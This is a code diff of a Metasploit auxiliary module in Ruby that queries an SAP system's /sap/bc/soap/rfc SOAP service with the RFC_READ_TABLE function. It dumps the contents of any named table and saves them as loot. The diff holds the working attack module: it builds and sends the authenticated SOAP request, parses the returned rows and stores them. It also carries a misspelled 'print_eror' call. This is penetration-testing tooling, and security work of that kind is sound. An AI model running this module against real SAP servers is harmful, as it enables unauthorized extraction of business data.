@@ -26,29 +26,37 @@ class Metasploit4 < Msf::Auxiliary
 
 	def initialize
 		super(
-			'Name' => 'SAP RFC RFC_READ_TABLE',
+			'Name' => 'SAP /sap/bc/soap/rfc SOAP Service RFC_READ_TABLE Function Dump Data',
 			'Description' => %q{
-				This module makes use of the RFC_READ_TABLE Remote Function Call (via SOAP) to read
-				data from tables.
-				},
-			'References' => [[ 'URL', 'http://labs.mwrinfosecurity.com/tools/2012/04/27/sap-metasploit-modules/' ]],
-			'Author' => [ 'Agnivesh Sathasivam', 'nmonkee' ],
-			'License' => BSD_LICENSE
-			)
+				This module makes use of the RFC_READ_TABLE Function to read data from tables using
+				the /sap/bc/soap/rfc SOAP service.
+			},
+			'References' =>
+				[
+					[ 'URL', 'http://labs.mwrinfosecurity.com/tools/2012/04/27/sap-metasploit-modules/' ]
+				],
+			'Author' =>
+				[
+					'Agnivesh Sathasivam',
+					'nmonkee'
+				],
+			'License' => MSF_LICENSE
+		)
 
-	register_options(
-		[
-			OptString.new('CLIENT', [true, 'Client', nil]),
-			OptString.new('USERNAME', [true, 'Username', nil]),
-			OptString.new('PASSWORD', [true, 'Password', nil]),
-			OptString.new('TABLE', [true, 'Table to read', nil]),
-			OptString.new('FIELDS', [true, 'Fields to read', '*'])
-		], self.class)
+		register_options(
+			[
+				Opt::RPORT(8000),
+				OptString.new('CLIENT', [true, 'Client', nil]),
+				OptString.new('USERNAME', [true, 'Username', nil]),
+				OptString.new('PASSWORD', [true, 'Password', nil]),
+				OptString.new('TABLE', [true, 'Table to read', nil]),
+				OptString.new('FIELDS', [true, 'Fields to read', '*'])
+			], self.class)
 	end
 
 	def run_host(ip)
 		columns = []
-		columns << '*' if datastore['FIELDS'].nil?
+		columns << '*' if datastore['FIELDS'].nil? or datastore['FIELDS'].empty?
 		if datastore['FIELDS']
 			columns.push (datastore['FIELDS']) if datastore['FIELDS'] =~ /^\w?/
 			columns = datastore['FIELDS'].split(',') if datastore['FIELDS'] =~ /\w*,\w*/
@@ -77,8 +85,6 @@ class Metasploit4 < Msf::Auxiliary
 		user_pass = Rex::Text.encode_base64(datastore['USERNAME'] + ":" + datastore['PASSWORD'])
 		print_status("[SAP] #{ip}:#{rport} - sending SOAP RFC_READ_TABLE request")
 		begin
-			error = ''
-			success = ''
 			res = send_request_raw({
 				'uri' => '/sap/bc/soap/rfc?sap-client=' + datastore['CLIENT'] + '&sap-language=EN',
 				'method' => 'POST',
@@ -91,7 +97,7 @@ class Metasploit4 < Msf::Auxiliary
 					'Content-Type' => 'text/xml; charset=UTF-8'
 					}
 				}, 45)
-			if res and res.code ! 500 and res.code != 200
+			if res and res.code != 500 and res.code != 200
 				# to do - implement error handlers for each status code, 404, 301, etc.
 				if res.body =~ /<h1>Logon failed<\/h1>/
 					print_error("[SAP] #{ip}:#{rport} - login failed!")
@@ -102,36 +108,41 @@ class Metasploit4 < Msf::Auxiliary
 			elsif res and res.body =~ /Exception/
 				response = res.body
 				error = response.scan(%r{<faultstring>(.*?)</faultstring>})
-				success = false
+				0.upto(error.length-1) do |i|
+					print_error("[SAP] #{ip}:#{rport} - error #{error[i]}")
+				end
 				return
-			else
-				response = res.body if res
-				success = true
-			end
-			if success
+			elsif res
+				response = res.body
 				output = response.scan(%r{<WA>([^<]+)</WA>}).flatten
 				print_status("[SAP] #{ip}:#{rport} - got response")
 				saptbl = Msf::Ui::Console::Table.new(
 					Msf::Ui::Console::Table::Style::Default,
-						'Header' => "[SAP] RFC_READ_TABLE",
-						'Prefix' => "\n",
-						'Postfix' => "\n",
-						'Indent' => 1,
-						'Columns' => ["Returned Data"]
-						)
+					'Header' => "[SAP] RFC_READ_TABLE",
+					'Prefix' => "\n",
+					'Postfix' => "\n",
+					'Indent' => 1,
+					'Columns' => ["Returned Data"]
+				)
 				0.upto(output.length-1) do |i|
 					saptbl << [output[i]]
 				end
 				print(saptbl.to_s)
-			end
-			if !success
-				0.upto(error.length-1) do |i|
-					print_error("[SAP] #{ip}:#{rport} - error #{error[i]}")
-				end
+				this_service = report_service(
+					:host  => ip,
+					:port => rport,
+					:name => 'sap',
+					:proto => 'tcp'
+				)
+				loot_path = store_loot("sap.tables.data", "text/plain", ip, saptbl.to_s, "#{ip}_sap_#{datastore['TABLE'].downcase}.txt", "SAP Data", this_service)
+				print_good("[SAP] #{ip}:#{rport} - Data stored in #{loot_path}")
+				return
+			else
+				print_eror("[SAP] #{ip}:#{rport} - Unknown error")
+				return
 			end
 		rescue ::Rex::ConnectionError
 			print_error("[SAP] #{ip}:#{rport} - Unable to connect")
-			return false
 		end
 	end
 end
